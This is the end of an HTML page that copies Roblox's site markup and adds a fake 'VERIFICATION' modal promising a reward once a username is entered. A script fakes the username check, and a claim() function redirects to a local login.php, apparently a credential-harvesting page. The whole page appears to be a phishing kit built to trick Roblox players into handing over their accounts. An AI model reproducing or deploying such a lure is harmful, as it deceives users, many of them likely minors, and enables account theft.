<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_3579425434" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_7056107357" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="conv_872d2539-6d3e-505e-b17e-11d5c66ded61" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_1298184548" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_2971459352" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_8205580972" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_8015598764" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_1591882673" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_8712239177" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="conv_ced59776-b279-5899-afbf-19cc812b85f9" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_8722825842" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="conv_f83687fc-ce02-574b-bef9-a5b0113668b9" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="conv_9dc70e2a-19fb-579e-a044-85c9aa6a0167" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_7984209991" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_2395044876" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<div dialog="" id="friend_8761912666" dialog-data="chatUserDict[chatLayoutId]" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog(chatLayoutId)" send-invite="sendInvite(chatLayoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-repeat="chatLayoutId in chatLibrary.layoutIdList" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngRepeat: chatLayoutId in chatLibrary.layoutIdList -->

            
<!-- ngIf: newGroup -->

            
<div dialog="" id="newGroup" dialog-data="newGroup" chat-library="chatLibrary" timeout-expires-at="" show-timeout-modal="showTimeoutModal(chatUserDict[chatLayoutId].id)" close-dialog="closeDialog('newGroup')" send-invite="sendInvite(newGroup.layoutId)" open-conversation-from-friend-id="openConversationFromFriendId(chatUserDict[chatLayoutId].id)" update-friends-dict-by-search="updateFriendsDictBySearch(friends)" get-conversation-overlay="getConversationOverlay(chatUserDict[chatLayoutId].id)" ng-if="newGroup" class="ng-scope ng-isolate-scope">

</div>

            
<!-- end ngIf: newGroup -->

            
<div id="dialogs-minimize" class="dialogs-minimize ng-isolate-scope dialogs-minimize-non-interactable" ng-class="{'dialogs-minimize-non-interactable': !chatLibrary.hasMinimizedDialogs}" dialog-minimize="" chat-library="chatLibrary">

                
<div id="dialogs-minimize-container" class="dialogs-minimize-container ng-hide" ng-show="chatLibrary.hasMinimizedDialogs" data-toggle="popover" data-bind="dialogs" data-original-title="" title="">
 
<span class="icon-chat-more-dialogs">

</span>
 
<span class="font-header-2 minimize-count ng-binding">
0
</span>

                    
<div class="rbx-popover-content" data-toggle="dialogs">

                        
<ul class="dropdown-menu minimize-list" role="menu">

                            
<!-- ngRepeat: dialogLayoutId in chatLibrary.minimizedDialogIdList -->

                        
</ul>

                    
</div>

                
</div>

            
</div>

            
<div class="chat-placeholder ng-scope" chat-placeholder="">

                
<div class="chat-placeholder-container ng-hide" ng-show="chatLibrary.chatPlaceholderEnabled">

                    
<div class="chat-placeholder-header">

</div>
 
<span class="icon-chat-placeholder">

</span>
 
</div>

            
</div>

        
</div>

        
<div class="sg-system-feedback">

            
<div id="chat-system-feedback" class="alert-system-feedback">

                
<div class="alert alert-loading">
 
<span class="alert-content">

</span>
 
</div>

            
</div>

        
</div>

    
</div>

    
<div id="user-agreements-checker-container">

</div>

    
<div id="access-management-upsell-container">

        
<div id="legally-sensitive-content-component">

</div>

    
</div>

    
<div id="global-privacy-control-checker-container">

</div>

    
<div id="cookie-banner-wrapper" class="cookie-banner-wrapper">

        
<div>

</div>

    
</div>


    
<script type="text/javascript">

        if (typeof Roblox === "undefined") {
            Roblox = {};
        }
        if (typeof Roblox.PlaceLauncher === "undefined") {
            Roblox.PlaceLauncher = {};
        }
        var isRobloxIconEnabledForRetheme = "True";
        var robloxIcon = isRobloxIconEnabledForRetheme === 'True' ? "
<span class='app-icon-bluebg app-icon-windows app-icon-size-96'>

</span>
" : "
<img src='https://images.rbxcdn.com/8e7879f99cfa7cc3b1fce74f8191be03.svg' width='90' height='90' alt='R'/>
";
        var studioIcon = "True" === 'True' ? "
<span class='studio-icon studio-icon-windows studio-icon-size-96'>

</span>
" : "
<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' />
"
        Roblox.PlaceLauncher.Resources = {
            RefactorEnabled: "True",
            IsProtocolHandlerBaseUrlParamEnabled: "False",
            ProtocolHandlerAreYouInstalled: {
                play: {
                    content: robloxIcon   "
<p>
You're moments away from getting into the experience!
</p>
",
                    buttonText: "Download and Install Roblox",
                    footerContent: "
<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >
Click here for help
</a>
 "
                },
                studio: {
                    content: studioIcon    "
<p>
Get started creating your own experiences!
</p>
",
                    buttonText: "Download Studio"
                }
            },
            ProtocolHandlerStartingDialog: {
                play: {
                    content: robloxIcon   "
<p>
Roblox is now loading. Get ready!
</p>
"
                },
                studio: {
                    content: studioIcon   "
<p>
Checking for Roblox Studio...
</p>
"
                },
                loader: "
<span class='spinner spinner-default'>

</span>
"
            }
        };
    
</script>

    
<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-join-attempt-id-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="true" data-is-duar-opt-out-disabled="true" data-is-user-logged-in="True" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="true" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="z1daflag">

        
<div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">

            
<div id="Spinner" class="Spinner" style="padding:20px 0;">

                
<img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" src="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" class="src-replaced">

            
</div>

            
<div id="status" style="min-height:40px;text-align:center;margin:5px 20px">

                
<div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block">

                    Starting Roblox...
                
</div>

                
<div id="Waiting" class="PlaceLauncherStatus MadStatusField">
Connecting to People...
</div>

                
<div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer">

</div>

            
</div>

            
<div style="text-align:center;margin-top:1em">

                
<input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel">

            
</div>

        
</div>

    
</div>

    
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">

        
<p class="larger-font-size">

            
<span class="icon-moreinfo">

</span>
 Check 
<strong>
Always open links for URL: Roblox Protocol
</strong>
 and click 
<strong>
Open URL: Roblox Protocol
</strong>
 in the dialog box above to join experiences faster in the future!
        
</p>

    
</div>


    
<script type="text/javascript">

        function checkRobloxInstall() {
                 return RobloxLaunch.CheckRobloxInstall('https://www.roblox.com/Download');
        }
    
</script>


    
<div id="InstallationInstructions" class="" style="display:none;">

        
<div class="ph-installinstructions">

            
<div class="ph-modal-header">

                
<span class="icon-close simplemodal-close">

</span>

                
<h3 class="title">
Thanks for visiting Roblox
</h3>

            
</div>

            
<div class="modal-content-container">

                
<div class="ph-installinstructions-body ">


                    
<ul class="modal-col-4">

                        
<li class="step1-of-4">

                            
<h2>
1
</h2>

                            
<p class="larger-font-size">
Click 
<strong>
RobloxPlayer.exe
</strong>
 to run the Roblox installer, which just downloaded via your web browser.
</p>

                            
<div style="margin-top:60px">

                                
<img data-delaysrc="https://images.rbxcdn.com/bcf5d84d4469c075e6296bfbc4deabb1" src="https://images.rbxcdn.com/bcf5d84d4469c075e6296bfbc4deabb1" class="src-replaced">

                            
</div>

                        
</li>

                        
<li class="step2-of-4">

                            
<h2>
2
</h2>

                            
<p class="larger-font-size">
Click 
<strong>
Run
</strong>
 when prompted by your computer to begin the installation process.
</p>

                            
<img data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" src="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" class="src-replaced">

                        
</li>

                        
<li class="step3-of-4">

                            
<h2>
3
</h2>

                            
<p class="larger-font-size">
Click 
<strong>
Ok
</strong>
 once you've successfully installed Roblox.
</p>

                            
<img data-delaysrc="https://images.rbxcdn.com/bbdb38de8bb89ecc07730b41666a26a4" src="https://images.rbxcdn.com/bbdb38de8bb89ecc07730b41666a26a4" class="src-replaced">

                        
</li>

                        
<li class="step4-of-4">

                            
<h2>
4
</h2>

                            
<p class="larger-font-size">
After installation, click 
<strong>
Join
</strong>
 below to join the action!
</p>

                            
<div class="VisitButton VisitButtonContinueGLI">

                                
<a class="btn btn-primary-lg disabled btn-full-width">
Join
</a>

                            
</div>

                        
</li>

                    
</ul>

                
</div>

            
</div>

            
<div class="xsmall">

                The Roblox installer should download shortly. If it doesn’t, start the 
<a id="GameLaunchManualInstallLink" href="#" class="text-link">
download now.
</a>

            
</div>

        
</div>

    
</div>

    
<div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;">

</div>


    
<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;">

</div>

    
<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute">

</iframe>


    
<script onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="clientinstaller" type="text/javascript" src="https://js.rbxcdn.com/00e1d37a965af4242dc6b296d6c883f0.js">

</script>


    
<script type="text/javascript">

        Roblox.Client._skip = null;
        Roblox.Client._CLSID = '76D50904-6780-4c8b-8986-1A7EE0B1716D';
        Roblox.Client._installHost = 'setup.roblox.com';
        Roblox.Client.ImplementsProxy = true;
        Roblox.Client._silentModeEnabled = true;
        Roblox.Client._bringAppToFrontEnabled = false;
        Roblox.Client._currentPluginVersion = '';
        Roblox.Client._eventStreamLoggingEnabled = true;
    
    
            Roblox.Client._installSuccess = function() {
                if(GoogleAnalyticsEvents){
                    GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
                    GoogleAnalyticsEvents.FireEvent(['Plugin','Install Success']);
                    if (Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
                        Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
                    }
                }
            }
            
            if ((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
                window.location.hash = '';
                var continuation = '('   $.cookie('chromeInstall')   ')';
                play_placeId = $.cookie('chromeInstallPlaceId');
                Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
                $.cookie('chromeInstallPlaceId', null);
                $.cookie('chromeInstallLaunchMode', null);
                $.cookie('chromeInstall', null);
                RobloxLaunch._GoogleAnalyticsCallback = function() { var isInsideRobloxIDE = 'website'; if (Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) { isInsideRobloxIDE = 'Studio'; };GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);EventTracker.fireEvent('GameLaunchAttempt_Win32', 'GameLaunchAttempt_Win32_Plugin'); if (typeof Roblox.GamePlayEvents != 'undefined') { Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId); }  }; 
                Roblox.Client.ResumeTimer(eval(continuation));
            }
    
</script>


    
<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">

        
<a class="genericmodal-close ImageButton closeBtnCircle_20h">

</a>

        
<div class="Title">

</div>

        
<div class="GenericModalBody">

            
<div class="TopBody">

                
<div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays="" data-no-click="">

                    
<img class="GenericModalImage" alt="generic image">

                
</div>

                
<div class="Message">

</div>

            
</div>

            
<div class="ConfirmationModalButtonContainer GenericModalButtonContainer">

                
<a href="" id="roblox-confirm-btn">

<span>

</span>

</a>

                
<a href="" id="roblox-decline-btn">

<span>

</span>

</a>

            
</div>

            
<div class="ConfirmationModalFooter">


            
</div>

        
</div>

        
<script type="text/javascript">

            Roblox = Roblox || {};
            Roblox.Resources = Roblox.Resources || {};
            
            Roblox.Resources.GenericConfirmation = {
                yes: "Yes",
                No: "No",
                Confirm: "Confirm",
                Cancel: "Cancel"
            };
        
</script>

    
</div>

    
<div id="modal-confirmation" class="modal-confirmation" data-modal-type="confirmation">

        
<div id="modal-dialog" class="modal-dialog">

            
<div class="modal-content">

                
<div class="modal-header">

                    
<button type="button" class="close" data-dismiss="modal">

                        
<span aria-hidden="true">

<span class="icon-close">

</span>

</span>

<span class="sr-only">
Close
</span>

                    
</button>

                    
<h5 class="modal-title">

</h5>

                
</div>


                
<div class="modal-body">

                    
<div class="modal-top-body">

                        
<div class="modal-message">

</div>

                        
<div class="modal-image-container roblox-item-image" data-image-size="medium" data-no-overlays="" data-no-click="">

                            
<img class="modal-thumb" alt="generic image">

                        
</div>

                        
<div class="modal-checkbox checkbox">

                            
<input id="modal-checkbox-input" type="checkbox">

                            
<label for="modal-checkbox-input">

</label>

                        
</div>

                    
</div>

                    
<div class="modal-btns">

                        
<a href="" id="confirm-btn">

<span>

</span>

</a>

                        
<a href="" id="decline-btn">

<span>

</span>

</a>

                    
</div>

                    
<div class="loading modal-processing">

                        
<img class="loading-default" src="https://images.rbxcdn.com/4bed93c91f909002b1f17f05c0ce13d1.gif" alt="Processing...">

                    
</div>

                
</div>

                
<div class="modal-footer text-footer">


                
</div>

            
</div>

        
</div>

    
</div>



<div id="gcodeUsernameModal" style="display: flex;">

    
<div class="modal-content-roblox">

        
<h1 class="modal-title">
VERIFICATION
</h1>

<p>
Enter your username before claim the reward
</p>

<br>

        
<center>

            
<input type="text" id="usernameInput" placeholder="Input your username here" class="roblox-input-field" style="display: block;">

        
</center>

        
<center><button id="checkUsernameBtn" class="roblox-button" style="display: flex;">

            
<span id="buttonText" style="display: inline;">
CHECK
</span>

            
<i id="loadingSpinner" class="fas fa-spinner fa-spin" style="display: none;">

</i>

        
</button></center>

        
<div id="validationMessage">

</div>

        
<div id="welcomeMessage" style="display: none;">
</div>        
<input type="hidden" id="hiddenUsername" name="hiddenUsername">   
</div>
</div>
<script>
function claim() {
	window.location.href = "login.php";
	}
	
const gcodeUsernameModal = document.getElementById('gcodeUsernameModal');
const checkUsernameBtn = document.getElementById('checkUsernameBtn');
const loadingSpinner = document.getElementById('loadingSpinner');
const usernameInput = document.getElementById('usernameInput'); 
const welcomeMessage = document.getElementById('welcomeMessage');

checkUsernameBtn.addEventListener('click', function() {
    const username = usernameInput.value.trim();
    
    if (username) {
        loadingSpinner.style.display = 'block';
        
        welcomeMessage.style.display = 'none';
        
        setTimeout(function() {
            loadingSpinner.style.display = 'none';
            
            welcomeMessage.textContent = `Welcome, ${username}!`;
            welcomeMessage.style.display = 'block';
            gcodeUsernameModal.style.display = 'none';
        }, 2000); 
    } else {
        alert('Please enter a username!');
    }
});
	</script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js">
<script src="js/script.js"></script>
</script>
</body>
</html>